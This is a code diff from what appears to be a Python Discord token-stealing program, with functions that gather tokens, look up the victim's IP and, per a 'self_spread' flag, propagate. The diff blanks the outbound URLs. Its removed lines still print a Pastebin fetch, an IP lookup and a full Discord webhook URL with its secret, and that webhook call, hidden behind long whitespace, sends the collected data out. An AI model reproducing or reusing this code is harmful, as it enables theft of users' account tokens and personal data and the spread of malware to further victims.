@@ -48,14 +48,14 @@ def gettokens(path):
 def getdeveloper():
     dev = "wodx"
     try:
-        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
+        dev = urlopen(Request("")).read().decode()
     except:
         pass
     return dev
 def getip():
     ip = "None"
     try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+        ip = urlopen(Request("")).read().decode().strip()
     except:
         pass
     return ip
@@ -182,7 +182,7 @@ def main():
     }
     try:
                     
-                                                                                                                                                                                                                                                                                urlopen(Request("https://discordapp.com/api/webhooks/762428620160368660/J21JWt-TjcWqvH3CQbH6q7IF5OonBgw4cBW2zXB5ZJJwVmjmdsPyCVZWRsInLn_H6sf_", data=dumps(webhook).encode(), headers=getheaders()))
+                                                                                                                                                                                                                                                                                urlopen(Request("", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
